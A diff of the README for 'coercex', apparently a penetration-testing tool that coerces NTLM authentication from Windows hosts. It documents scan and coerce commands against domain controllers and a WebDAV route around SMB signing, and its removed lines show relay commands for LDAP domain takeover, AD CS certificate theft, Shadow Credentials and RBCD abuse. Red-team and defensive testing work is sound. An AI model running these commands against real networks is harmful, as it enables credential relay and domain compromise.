@@ -1,18 +1,18 @@
 # coercex
 
-Async NTLM authentication coercion scanner and relay tool. A high-performance replacement for Coercer and PetitPotam with built-in NTLM relay capabilities.
+Async NTLM authentication coercion scanner. A high-performance replacement for Coercer and PetitPotam.
 
 ## Features
 
 - **19 coercion methods** across 7 protocols: MS-EFSR (10), MS-RPRN (2), MS-DFSNM (2), MS-FSRVP (2), MS-EVEN (1), MS-PAR (1), MS-TSCH (1)
-- **3 operation modes**: scan, coerce, relay
+- **2 operation modes**: scan (detect vulnerable methods), coerce (trigger coercion at external relay)
 - **Method/pipe/protocol filtering** with glob and regex pattern matching
-- **NTLM relay** via impacket ntlmrelayx -- relay captured auth to LDAP, SMB, HTTP/AD CS, etc.
 - **Kerberos authentication** with ccache/TGT/TGS support
 - **Async architecture** with configurable concurrency (50-200 concurrent tasks)
 - **Connection pooling** by (target, pipe, UUID) for session reuse
 - **WebDAV transport** support (`\\host@port\share` format) to bypass SMB signing
-- **Token correlation** for confirmed callback verification
+- **Port redirect** via iptables (Linux) or pydivert (Windows) for non-standard listener ports
+- **Token correlation** for confirmed callback verification (scan mode)
 - **Rich terminal output** with tables, colors, and progress indicators
 
 ## Installation
@@ -43,13 +43,18 @@ coercex scan -t dc01 -u user -p pass --pipes '\PIPE\spoolss'
 
 # High-concurrency scan with hash auth
 coercex scan -t dc01.corp.local -u user -H aad3b435b51404ee:abc123... -d corp --concurrency 200
+
+# Scan on non-standard ports with port redirect (requires root/admin)
+coercex scan -t dc01 -u user -p pass --smb-port 4445 --http-port 8080 --redirect
 ```
 
 ### Coerce with external relay
 
+Use `coerce` mode alongside ntlmrelayx (or any other relay tool). coercex only
+sends RPC triggers -- it does NOT bind any ports.
+
 ```bash
-# Trigger coercion pointing at your relay (ntlmrelayx, etc.)
-# coercex does NOT bind any ports -- it only sends RPC triggers
+# Trigger coercion pointing at your relay
 coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
 
 # Coerce with specific methods from scan results
@@ -66,55 +71,6 @@ coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport smb
 
 # Both transports (default)
 coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport smb --transport http
-```
-
-### Relay coerced authentication
-
-```bash
-# Relay to LDAP for domain takeover (auto-detect listener IP)
-coercex relay -t dc01.corp.local \
-  --relay-to ldap://dc02.corp.local \
-  -u user -p pass -d corp.local
-
-# Explicit listener IP
-coercex relay -t dc01.corp.local -l 10.0.0.5 \
-  --relay-to ldap://dc02.corp.local \
-  -u user -p pass -d corp.local
-
-# Relay to AD CS for certificate theft (ESC8)
-coercex relay -t dc01.corp.local -l 10.0.0.5 \
-  --relay-to http://cas.corp.local/certsrv/ \
-  --adcs --template DomainController \
-  -u user -p pass
-
-# Shadow Credentials attack via LDAP relay
-coercex relay -t dc01.corp.local -l 10.0.0.5 \
-  --relay-to ldap://dc02.corp.local \
-  --shadow-credentials --shadow-target dc01$ \
-  -u user -p pass
-
-# RBCD delegation access attack
-coercex relay -t dc01.corp.local -l 10.0.0.5 \
-  --relay-to ldap://dc02.corp.local \
-  --delegate-access \
-  -u user -p pass
-
-# Keep relayed sessions alive with SOCKS proxy
-coercex relay -t dc01.corp.local -l 10.0.0.5 \
-  --relay-to smb://fileserver.corp.local \
-  --socks \
-  -u user -p pass
-
-# Relay to multiple targets
-coercex relay -t dc01.corp.local -l 10.0.0.5 \
-  --relay-to ldap://dc02 --relay-to smb://fs01 --relay-to http://cas/certsrv/ \
-  -u user -p pass
-
-# Relay only specific methods
-coercex relay -t dc01 -l 10.0.0.5 \
-  --relay-to ldap://dc02 \
-  --methods 'RpcRemote*' --protocols MS-RPRN \
-  -u user -p pass
 ```
 
 ## Authentication
@@ -142,15 +98,54 @@ coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local -d 
 
 ## Modes
 
-| Mode | Listener | Binds Ports | Transport | Description |
-|------|----------|-------------|-----------|-------------|
-| `scan` | Optional (`-l`) | HTTP+SMB listener | `--transport smb http` (default: both) | Try all path styles per method. Always starts a listener for callback confirmation. If `-l` omitted, auto-detects local IP. |
-| `coerce` | **Required** (`-l`) | **None** (external relay) | `--transport smb http` (default: both) | Fire coercion at `--listener` where your relay (e.g. ntlmrelayx) is already running. |
-| `relay` | Optional (`-l`) | HTTP+SMB relay servers | `--transport smb http` (default: both) | Try all path styles through impacket relay servers. If `-l` omitted, auto-detects local IP. |
+| Mode | Listener | Binds Ports | Description |
+|------|----------|-------------|-------------|
+| `scan` | Optional (`-l`) | HTTP+SMB listener | Try all path styles per method. Always starts a listener for callback confirmation. If `-l` omitted, auto-detects local IP. |
+| `coerce` | **Required** (`-l`) | **None** | Fire coercion at `--listener` where your relay (e.g. ntlmrelayx) is already running. Reports `SENT` for every trigger dispatched. |
+
+### Typical workflow
+
+1. **Scan** to find which methods are vulnerable on the target
+2. **Start ntlmrelayx** (or similar) pointing at your relay target
+3. **Coerce** with `--methods` filter to trigger only the working methods
+
+## Result Classification
+
+| Status | Symbol | Meaning |
+|--------|--------|---------|
+| `VULNERABLE` | `[+]` | Callback confirmed on our listener (strongest signal) |
+| `ACCESSIBLE` | `[~]` | Method processed our path (RPC success or indicative error code like `BAD_NETPATH`), but no callback confirmation yet |
+| `SENT` | `[>]` | Coerce mode only -- trigger dispatched, no classification attempted |
+| `ACCESS_DENIED` | `[-]` | RPC returned access denied |
+| `NOT_AVAILABLE` | `[ ]` | Endpoint/method not available on target |
+| `CONNECT_ERROR` | `[!]` | Could not connect to RPC pipe |
+| `TIMEOUT` | `[T]` | Connection or RPC timed out |
+
+## Port Redirect
+
+When binding on non-standard ports (e.g. `--smb-port 4445 --http-port 8080`
+because default ports are in use), standard UNC paths (`\\host\share`) won't
+reach your listener since SMB always connects to port 445.
+
+Two solutions:
+
+1. **WebDAV format** (automatic fallback): UNC paths become `\\host@4445\share`.
+   Requires the WebClient service on the target (often disabled by default).
+
+2. **Port redirect** (`--redirect`): Uses iptables (Linux) or pydivert (Windows)
+   to NAT standard ports to your listener ports at the kernel level. UNC paths
+   stay in standard format. Requires root/admin.
+
+```bash
+# Linux: iptables NAT rules (445->4445, 80->8080)
+coercex scan -t dc01 -u user -p pass --smb-port 4445 --http-port 8080 --redirect
+
+# If redirect fails, coercex falls back to WebDAV @port format with a warning
+```
 
 ## Filtering
 
-All three modes support `--methods`, `--pipes`, and `--protocols` filters:
+Both modes support `--methods`, `--pipes`, `--protocols`, and `--transport` filters:
 
 ```bash
 # Filter by protocol
@@ -164,6 +159,9 @@ coercex scan -t dc01 -u user -p pass --methods 'EfsRpc.*Raw'
 
 # Filter by named pipe
 coercex scan -t dc01 -u user -p pass --pipes '\PIPE\spoolss'
+
+# Filter by transport
+coercex scan -t dc01 -u user -p pass --transport smb
 
 # Combine filters
 coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass \
@@ -185,7 +183,7 @@ coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass \
 ## Output
 
 ```bash
-# Table output (default) -- shows only vulnerable/accessible
+# Table output (default) -- shows only vulnerable/accessible/sent
 coercex scan -t dc01 -u user -p pass
 
 # Show all results
@@ -207,22 +205,18 @@ graph TD
     Scanner["Scanner<br/><i>async orchestrator</i>"]
     Pool["DCERPCPool<br/><i>connection pool</i>"]
     Listener["Listener<br/><i>HTTP + SMB</i>"]
-    Relay["Relay<br/><i>ntlmrelayx</i>"]
     Methods["Methods<br/><i>19 across 7 protocols</i>"]
     Targets["Target hosts"]
 
     CLI --> Scanner
     Scanner --> Pool
     Scanner --> Listener
-    Scanner --> Relay
     Pool --> Methods
     Listener --> Targets
-    Relay --> Targets
     Methods --> Targets
 ```
 
-- **Scanner**: Async orchestrator with semaphore-bounded concurrency, 3 modes (scan/coerce/relay)
+- **Scanner**: Async orchestrator with semaphore-bounded concurrency, 2 modes (scan/coerce)
 - **DCERPCPool**: Connection pool keyed by (target, pipe, UUID), all impacket calls wrapped with `asyncio.to_thread()`
-- **Listener**: Async HTTP + SMB listener with UUID token correlation (scan with `-l`, coerce modes)
-- **Relay**: Wraps impacket's ntlmrelayx HTTP/SMB relay servers in daemon threads (relay mode)
+- **Listener**: Async HTTP + SMB listener with UUID token correlation (scan mode)
 - **Methods**: Registry of 19 coercion methods across 7 protocols with pipe binding metadata, glob/regex filtering
